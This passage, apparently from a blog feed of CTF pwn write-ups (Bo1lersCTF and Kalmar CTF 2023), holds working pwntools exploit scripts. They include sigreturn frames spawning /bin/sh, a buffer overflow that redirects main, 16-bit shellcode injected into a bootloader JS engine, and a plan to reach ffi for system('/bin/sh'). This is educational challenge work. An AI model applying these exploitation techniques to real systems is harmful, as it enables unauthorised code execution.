       gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    No RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line"># rax syscall x64</span><br><span class="line"># 0   read</span><br><span class="line"># 1   write</span><br><span class="line"># 15  rt_sigreturn</span><br><span class="line"># 59  execve</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">syscall_ret_addr = 0x00401018</span><br><span class="line">fake_rwx_stack_addr = 0x004020b8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_frame = SigreturnFrame()</span><br><span class="line">mprotect_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">mprotect_frame.rsp = fake_rwx_stack_addr</span><br><span class="line">mprotect_frame.rax = constants.SYS_mprotect</span><br><span class="line">mprotect_frame.rdi = 0x00402000</span><br><span class="line">mprotect_frame.rsi = 0x1000</span><br><span class="line">mprotect_frame.rdx = 7 # rwx</span><br><span class="line"></span><br><span class="line">do_mprotect = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(mprotect_frame)</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">input(&quot;send mprotect payload&quot;)</span><br><span class="line">io.send(do_mprotect) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execve_bin_sh_frame = SigreturnFrame()</span><br><span class="line">execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">execve_bin_sh_frame.rsp = fake_rwx_stack_addr # </span><br><span class="line">execve_bin_sh_frame.rax = constants.SYS_execve</span><br><span class="line">execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat(&#123;0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]&#125;))</span><br><span class="line">execve_bin_sh_frame.rsi = 0</span><br><span class="line">execve_bin_sh_frame.rdx = 0</span><br><span class="line"></span><br><span class="line">do_execve_bin_sh = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(execve_bin_sh_frame),</span><br><span class="line">        b&quot;/bin/sh\x00&quot;,</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input(&quot;send execve bin/sh payload&quot;)</span><br><span class="line">io.send(do_execve_bin_sh) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{1_6u355_7h475_h0w_w3_3xpl017_17}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]</title>
    <url>/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html</url>
    <content><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>A tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt</p>
<p><a href="https://github.com/b01lers/b01lers-ctf-2023-public/tree/main/pwn/cfifufuuufuuuuu">files</a></p>
<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>


<h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><p>my analysis database <a href="./s.bndb">s.bndb</a></p>
<p>This binary is run by a python loaders. python loader is acting like a debugger.</p>
<p>Everytime a breakpoint instruction (<code>0xcc</code>) being executed. python loader will check next byte after rip. And determine what to do next depend on that byte.</p>
<p>for example, if next byte is <code>0x48</code>. it will replace some register</p>
<p><img data-src="/./2023-03-28_214738.png" alt="image"></p>
<p>otherwise, if the next byte is equal to some other bytes. it will do a canary check manually</p>
<p><img data-src="/./2023-03-28_214958.png" alt="image"></p>
<h2 id="vulnerability-1-canary-check-failed"><a href="#vulnerability-1-canary-check-failed" class="headerlink" title="vulnerability 1 - canary check failed"></a>vulnerability 1 - canary check failed</h2><p>it did have canary check. The canary values are actually saved return pointers. However, when comparing return pointers, it only check if return pointer exists in the stack. So, we can still modify the saved return pointer to the caller&#39;s saved return pointer.</p>
<h2 id="vulnerability-2-overwriting"><a href="#vulnerability-2-overwriting" class="headerlink" title="vulnerability 2 - overwriting"></a>vulnerability 2 - overwriting</h2><p>Bascially, the binary contains 2 main function. <code>encrypt</code> and <code>decrypt</code></p>
<p><code>decrypt</code> function calls a function which read all bytes until it meet a new line character (<code>\n</code>). This is a trivial buffer overflow we can use to modify return pointer.</p>
<p>using this vulnerability with the previous one, we can run <code>main</code> function again.</p>
<p>since <code>_start</code> function is essentially a loop if return value of <code>main</code> is not equal to 1</p>
<p><img data-src="/./2023-03-28_220216.png" alt="image"></p>
<h2 id="vulnerability-3-random-generation"><a href="#vulnerability-3-random-generation" class="headerlink" title="vulnerability 3 - random generation"></a>vulnerability 3 - random generation</h2><p>encrypt function generating random values by reading <code>/dev/urandom</code>. And store using input is .bss section.</p>
<p>it also use a global variable to record index of the data array. everytime we call <code>encrypt</code>, the index will increase by one.</p>
<p><img data-src="/./2023-03-28_215944.png" alt="image"></p>
<p>normally it&#39;s okay, because we are only executing <code>encrypt</code> function once.</p>
<p>however, since we can run <code>encrypt</code> function multiple time. we increase the index value until we overwrite <code>/dev/urandom</code> string.</p>
<h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><p>we overwrite <code>/dev/urandom</code>, and the program will print out the flag for us!</p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;s&quot;)</span><br><span class="line"># exe_rop = ROP(exe)</span><br><span class="line"># libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"># ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"># context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">def wait(*msg):</span><br><span class="line">    if args.WAIT:</span><br><span class="line">        input(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([&quot;python&quot;,&quot;./loader.py&quot;])</span><br><span class="line">        r.recvuntil(b&quot;pid=&quot;)</span><br><span class="line">        pid = int(r.recvuntil(b&quot;;\n&quot;,drop=True))</span><br><span class="line">        print(&quot;pid of the binary is %d&quot; % pid)</span><br><span class="line">        if args.R2:</span><br><span class="line">            util.proc.wait_for_debugger(pid)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;ctf.b01lers.com&quot;, 5215)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">flagstring = b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)</span><br><span class="line">nonesense = b&#x27;\x00&#x27;*0x10</span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    0x0: b&#x27;\x00&#x27;*0x10, # make all 0, easier for xor</span><br><span class="line">    0x38:[</span><br><span class="line">        0x00004005e2, # _start if eax=1, call main again </span><br><span class="line">    ]</span><br><span class="line">&#125;)+b&#x27;\n&#x27;</span><br><span class="line"># filled up data</span><br><span class="line">for i in range(8):</span><br><span class="line">    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)</span><br><span class="line">    io.sendafter(b&quot;Your key?:\n&quot;,payload)</span><br><span class="line"># overflow /dev/urandom</span><br><span class="line">io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">io.recvuntil(b&quot;Your key:\n&quot;)</span><br><span class="line">lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop=True))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] js-in-my-bs [Kalmar CTF 2023]</title>
    <url>/ctf-writeup/2023/kalmar/pwn/js-in-my-bs/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
<p>Files: TBD</p>
<h1 id="0x1-Playing-around-with-their-JS-engine"><a href="#0x1-Playing-around-with-their-JS-engine" class="headerlink" title="0x1 Playing around with their JS engine"></a>0x1 Playing around with their JS engine</h1><p>Challenge runs under a i386 environment using a simulator (qemu)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-i386 -L /bios -display none -drive format=raw,file=&quot;./bootjs.bin&quot; -serial stdio</span><br></pre></td></tr></table></figure>

<p>qemu simulator will load boot section in bootjs.bin and spawn a javascript console(?).</p>
<p>In this javascript console, I was able to executing some basic command such as simple math operation, print(function calling), and variable assignment.</p>
<p><img data-src="/./2023-03-05_220531.png" alt="2023-03-05_220531.png"></p>
<p>However, I found certain limitation when playing with this simulator</p>
<ol>
<li>variable name can only be an one byte character, (eg <code>a</code>,<code>b</code>)</li>
<li>math operation only support number from 0-9 (also single byte)</li>
</ol>
<p>OK, then where is the flag. Lets take look at bootjs.bin</p>
<h1 id="0x2-Preparation"><a href="#0x2-Preparation" class="headerlink" title="0x2 Preparation"></a>0x2 Preparation</h1><p>Before starting reversing, I first did some research about i386 boot loader. (see reference section)</p>
<p>boot loader is loaded after bios. and bios will load first sector of  boot loader (<strong>512 bytes</strong>) to a fixed address in memory (0x7c00). </p>
<p><img data-src="/./2023-03-05_221209.png" alt="2023-03-05_221209.png"></p>
<p>Boot loader is usually written in 16-bit assembly. executing in cpu real mode. </p>
<p>The main task for boot loader is to load kernel into memory. Then, kernel will deal with everything else after that. (Which is not the case for this challenge, the boot loader for this challenge is a js engine)</p>
<h1 id="0x3-Reversing-Analyzing"><a href="#0x3-Reversing-Analyzing" class="headerlink" title="0x3 Reversing &amp; Analyzing"></a>0x3 Reversing &amp; Analyzing</h1><p>After loaded <code>bootjs.bin</code> in Binary Ninja. I found the placeholder flag instantaneously. flag bytes start at <code>0x7e00</code> after a MBR boot signature <code>55AA</code>. </p>
<p>Above flag bytes, there is a huge chunk of suspicious <code>A</code>s. </p>
<p><img data-src="/./2023-03-05_222644.png" alt="2023-03-05_222644.png"></p>
<p>We know that bios only load first sector of boot loader into memory, flag bytes was clearly not in the memory (0x7e00-0x7c00 &#x3D; 0x200 &#x3D; 512).</p>
<p>(Therefore, at some point, I have to executing some shellcode so that I could load flag bytes into the memory.)</p>
<p>After took some time analyzing the binary file, I came up with those  functions</p>
<p><img data-src="/./2023-03-05_224254.png" alt="2023-03-05_224254.png"></p>
<p><code>print_byte</code>: print one byte as ascii to screen.</p>
<p><code>print_crlf</code>: print CRLF to screen <code>\r\n</code> </p>
<p><code>print_hex</code>: print 4 bit as hex.</p>
<p><img data-src="/./2023-03-05_224037.png" alt="2023-03-05_224037.png"></p>
<p><code>read_input</code>: read one byte from user input and print it back to screen</p>
<p><img data-src="/./2023-03-05_224658.png" alt="2023-03-05_224658.png"></p>
<p><code>math_op</code>: perform math operation recursively</p>
<p><img data-src="/./2023-03-05_224909.png" alt="2023-03-05_224909.png"></p>
<p><code>input_to_num</code>: ask one byte from user input. </p>
<p>If user input is a number then return the number itself (<code>sub al, 0x30</code>). </p>
<p>Otherwise, it is a variable. So, it will get the value of that variable using <code>var_to_num</code>(actually set si to the data offset) and return the value.</p>
<p><img data-src="/./2023-03-05_225041.png" alt="2023-03-05_225041.png"></p>
<p><code>entry</code>: main loop</p>
<p>if second byte is <code>=</code>, it will perform variable assignment <code>mov word ptr [si], bx</code>. </p>
<p>If second byte is a <code>(</code>, it will regard first byte as a fucntion name. and call this function. <code>call word ptr [si]</code></p>
<p><img data-src="/./2023-03-05_225456.png" alt="2023-03-05_225456.png"></p>
<p><code>log_print</code>: print two bytes as hex</p>
<p><img data-src="/./2023-03-05_230553.png" alt="2023-03-05_230553.png"></p>
<p><strong>Finally</strong>, the vulnerable funtion <code>var_to_num</code></p>
<p>This function uses the suspicious chunk start from <code>0x7cda</code> as a <strong>variable table</strong></p>
<p>This <strong>variable table</strong> store all existing variable name and value (or function name and address). Each variable entry (or function entry) occupy 3 bytes (1 byte name, 2 byte data).</p>
<p>For example, the binary came with a built in function <code>l</code> (which print value in a variable as hex). </p>
<p>So, in the variable table, <code>6c7a7c</code> represents this entry. Where <code>6c</code> is the function name <code>l</code>, <code>7a7c</code> is the function address of <code>log_print</code> in little endian (<code>0x7c7a</code>) </p>
<p><img data-src="/./2023-03-05_225921.png" alt="2023-03-05_225921.png"></p>
<p>Also, register <code>cx</code> hold how many variables&#x2F;functions are in the variable table.</p>
<p>Here is the pesudo code for <code>var_to_num</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func var_to_num(var_name):</span><br><span class="line">    si = variable_table = 0x7cda</span><br><span class="line">    idx = 0</span><br><span class="line">    while idx &lt; cx:</span><br><span class="line">        if var_name is the first byte in variable table:</span><br><span class="line">            si = si +1 // move si to data section</span><br><span class="line">            return</span><br><span class="line">        si = si +3 // move to next entry</span><br><span class="line">        idx ++</span><br><span class="line">    // if variable name not found in variable table</span><br><span class="line">    cx = cx + 1 // increase variable count</span><br><span class="line">    si[0] = var_name // set first byte to variable name</span><br><span class="line">    si = si + 1 // move si to data section</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>

<p>Here we go, I got a limited arbitrary write in an executable region!</p>
<p>limitation: first bytes of every three bytes in shellcodes must be different</p>
<p>Now I can write shellcode in this region and run the shellcode by calling a custom function.</p>
<h1 id="0x4-crafting-shellcode"><a href="#0x4-crafting-shellcode" class="headerlink" title="0x4 crafting shellcode"></a>0x4 crafting shellcode</h1><p>Our shellcode need to do two thing: load second sector from drive into the memory; and print out the flag</p>
<h2 id="print-out-flag"><a href="#print-out-flag" class="headerlink" title="print out flag:"></a>print out flag:</h2><ol>
<li>setting up register</li>
<li>using <code>lodsb</code> to load one byte to <code>al</code> and move <code>si</code> to next byte</li>
<li>print out <code>al</code> using <code>out dx,al</code></li>
<li>jump to step 2 again using <code>jmp</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop</span><br></pre></td></tr></table></figure>

<h2 id="load-second-sector-into-memory"><a href="#load-second-sector-into-memory" class="headerlink" title="load second sector into memory"></a>load second sector into memory</h2><p>This part is bit tricky, but I found a very good post about how to load second sector <a href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a>. </p>
<p>So I just copy paste their assembly code and did some modification.</p>
<p>something to be noted</p>
<p><code>int 0x13</code> uses cylinder-head-sector (CHS) addressing. In CHS addressing, sector index start with <strong>1</strong> instead of <strong>0</strong> due to some historical reason.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x2                ; read sectors from drive</span><br><span class="line">nop</span><br><span class="line">mov al, 1                  ; sectors to read</span><br><span class="line">nop</span><br><span class="line">mov ch, 0                  ; cylinder idx</span><br><span class="line">nop</span><br><span class="line">mov dh, 0                  ; head idx</span><br><span class="line">nop</span><br><span class="line">mov cl, 2                  ; sector idx</span><br><span class="line">nop</span><br><span class="line">mov dl, 0x80               ; disk idx</span><br><span class="line">nop</span><br><span class="line">mov bx, 0x7e00             ; target pointer</span><br><span class="line">int 0x13                   ; interrupt</span><br></pre></td></tr></table></figure>


<h2 id="final-shellcode"><a href="#final-shellcode" class="headerlink" title="final shellcode"></a>final shellcode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bits 16]</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ah, 0x2                ; read sectors from drive</span><br><span class="line">    nop</span><br><span class="line">    mov al, 1                  ; sectors to read</span><br><span class="line">    nop</span><br><span class="line">    mov ch, 0                  ; cylinder idx</span><br><span class="line">    nop</span><br><span class="line">    mov dh, 0                  ; head idx</span><br><span class="line">    nop</span><br><span class="line">    mov cl, 2                  ; sector idx</span><br><span class="line">    nop</span><br><span class="line">    mov dl, 0x80               ; disk idx</span><br><span class="line">    nop</span><br><span class="line">    mov bx, 0x7e00             ; target pointer</span><br><span class="line">    int 0x13                   ; interrupt</span><br><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop                        ; padding</span><br></pre></td></tr></table></figure>

<blockquote>
<p>credit to my teammate @jason</p>
</blockquote>
<p>compile it with</p>
<p><code>nasm shellcode.asm -o shellcode.o</code></p>
<p>yep! all the first bytes are different!!!!!</p>
<p><img data-src="/./2023-03-05_233622.png" alt="2023-03-05_233622.png"></p>
<h1 id="0x5-Script-Steps"><a href="#0x5-Script-Steps" class="headerlink" title="0x5 Script Steps"></a>0x5 Script Steps</h1><ol>
<li>write function which point to shell code</li>
<li>write shellcode</li>
<li>call shellcode</li>
<li>retrieve flag</li>
</ol>
<h1 id="0x6-Exploit"><a href="#0x6-Exploit" class="headerlink" title="0x6 Exploit"></a>0x6 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([<span class="string">&quot;qemu-system-i386&quot;</span>, </span><br><span class="line">            <span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./bios&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-display&quot;</span>,<span class="string">&quot;none&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-drive&quot;</span>,<span class="string">&quot;format=raw,file=bootjs.bin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-serial&quot;</span>,<span class="string">&quot;stdio&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;54.93.211.13&quot;</span>, <span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.LOCAL:</span><br><span class="line">    hash_challenge = io.recvline().split()</span><br><span class="line">    lp(<span class="string">&quot;proof of work:&quot;</span>, hash_challenge)</span><br><span class="line">    <span class="keyword">if</span> hash_challenge[<span class="number">0</span>] == <span class="string">b&#x27;hashcash&#x27;</span> <span class="keyword">and</span> hash_challenge[<span class="number">1</span>] == <span class="string">b&#x27;-mb28&#x27;</span>:</span><br><span class="line">        response = subprocess.run([</span><br><span class="line">            <span class="string">&#x27;hashcash&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-mb28&#x27;</span>,</span><br><span class="line">            hash_challenge[<span class="number">2</span>].decode(),</span><br><span class="line">        ], capture_output=<span class="literal">True</span>).stdout</span><br><span class="line">        io.send(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_js</span>(<span class="params">value</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt; &quot;</span>,value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_rs</span>(<span class="params">is_log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> is_log:</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b40290b00190b50090b60090b10290b28090bb007ecd13baf80389deaceeebfc90&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_mem</span>(<span class="params">val,value</span>):</span><br><span class="line">    <span class="comment"># dec_value = int.from_bytes(value,&quot;little&quot;)</span></span><br><span class="line">    payload = val+<span class="string">b&#x27;=&#x27;</span>+(<span class="built_in">str</span>(value % <span class="number">9</span>)+<span class="string">&quot;+9&quot;</span>*(value // <span class="number">9</span>)+<span class="string">&quot;\n&quot;</span>).encode()</span><br><span class="line">    <span class="comment"># lp(payload)</span></span><br><span class="line">    send_js(payload)</span><br><span class="line">    <span class="comment"># lp(io.recvuntil(b&quot;\r\n&quot;))</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">write_to_mem(<span class="string">b&quot;a&quot;</span>,<span class="number">0x7c7a</span>)</span><br><span class="line">write_to_mem(<span class="string">b&#x27;b&#x27;</span>,<span class="number">0x7ce3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">3</span>):</span><br><span class="line">    part =  shellcode[i:i+<span class="number">3</span>]</span><br><span class="line">    lp(<span class="string">&quot;sending&quot;</span>,i,part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>)))</span><br><span class="line">    write_to_mem(part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">send_js(<span class="string">b&quot;b(0)&quot;</span>)</span><br><span class="line">lp(io.recvuntil(<span class="string">b&quot;&#125;&quot;</span>))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<h1 id="0x7-flag"><a href="#0x7-flag" class="headerlink" title="0x7 flag"></a>0x7 flag</h1><p><code>kalmar&#123;this_would_be_a_nice_addon_to_all_efi_shells_right?&#125;</code></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="https://infosecwriteups.com/writing-a-bootloader-931da062f25b">https://infosecwriteups.com/writing-a-bootloader-931da062f25b</a></li>
<li><a href="https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846">https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846</a></li>
<li><a href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a></li>
<li><a href="https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html">https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html</a></li>
<li><a href="https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive">https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive</a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] mjs [Kalmar CTF 2023]</title>
    <url>/ctf-writeup/2023/kalmar/pwn/mjs/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
<p>Files: TBD</p>
<h1 id="0x1-Investigating-Repository"><a href="#0x1-Investigating-Repository" class="headerlink" title="0x1 Investigating Repository"></a>0x1 Investigating Repository</h1><p>looking at mjs github <a href="https://github.com/cesanta/mjs">repo</a></p>
<p>I found three vary suspicious function. <code>mkstr</code> and <code>ffi</code>. </p>
<p><code>mkstr</code> allow you make string in <strong>any</strong> memory address.</p>
<p><code>ffi</code> allow you to import C function into js environment. This means we can import <code>system</code> into js environment and call <code>system(&#39;/bin/sh&#39;)</code> to getting a shell.</p>
<p><img data-src="/./2023-03-05_171001.png" alt="2023-03-05_171001.png"></p>
<p>However, challenge disabled those function. So, if you are trying to call those function, you will find this function is not defined. </p>
<p><img data-src="/./2023-03-05_171552.png" alt="2023-03-05_171552.png"></p>
<p>When I&#39;m playing around with this javascript engine. I found following interesting statements. </p>
<p>We can operate function pointer using mathematical operation (like C). </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">17:19:25 $ ./mjsvuln -e <span class="string">&quot;print(print)&quot;</span></span><br><span class="line">&lt;foreign_ptr@405920&gt;</span><br><span class="line">undefined</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:25:52 $ ./mjsvuln -e <span class="string">&quot;(0x405920)(1)&quot;</span></span><br><span class="line">  at &lt;stdin&gt;:1</span><br><span class="line">MJS error: calling non-callable</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:26:04 $ ./mjsvuln -e <span class="string">&quot;(print+9-9)(print)&quot;</span></span><br><span class="line">&lt;foreign_ptr@405920&gt;</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>

<p><em>The binary is compiled with glibc2.34. I&#39;m using Ubuntu20.04, so I need to recompile the binary again. So, some function offset might is different from the original binary.</em></p>
<p>I calculated the offset between <code>print</code> and <code>ffi</code>. And try to call <code>ffi</code> again. This time, it succeed with an unknown function pointer.</p>
<p><img data-src="/./2023-03-05_183906.png" alt="2023-03-05_183906.png"></p>
